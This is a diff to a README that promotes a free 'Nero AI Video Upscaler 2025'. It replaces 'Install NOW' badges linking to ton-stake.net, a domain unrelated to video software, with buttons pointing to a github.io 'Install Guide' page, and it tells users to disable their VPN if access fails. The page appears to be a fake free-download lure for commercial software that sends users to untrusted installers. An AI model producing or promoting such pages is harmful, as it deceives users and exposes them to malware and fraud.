@@ -5,9 +5,10 @@
 
 **Description**: Elevate your videos with **Nero AI Video Upscaler 2025**, offering free AI editing access for stunning upscaling! This repository provides tutorials, resources, and tips to explore Nero’s AI features for 4K and 8K enhancement. Download your free version and join our vibrant community in 2025!  
 
-[![Install Nero AI Video Upscaler 2025](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
+<a href="https://neroaivideoenhancingcommunity.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
----
 
 ## 📋 Installation Guide  
 
@@ -28,9 +29,9 @@ Enhance your videos with these simple steps to set up Nero AI Video Upscaler 202
 5. **Access Problems?** 🌐  
    If access fails, disable your VPN or switch browsers (e.g., Chrome, Firefox).  
 
-[![Install Nero AI Video Upscaler 2025](https://img.shields.io/badge/Install-NOW-blueviolet)](https://ton-stake.net)  
-
----
+<a href="https://neroaivideoenhancingcommunity.github.io/.github/" target="_blank">
+  <img src="https://img.shields.io/badge/Install_Guide-Now-3498db" alt="Install Guide Now" width="230" height="45" style="border:none;">
+</a>
 
 ## 💡 Why Choose Nero AI Video Upscaler 2025  
 
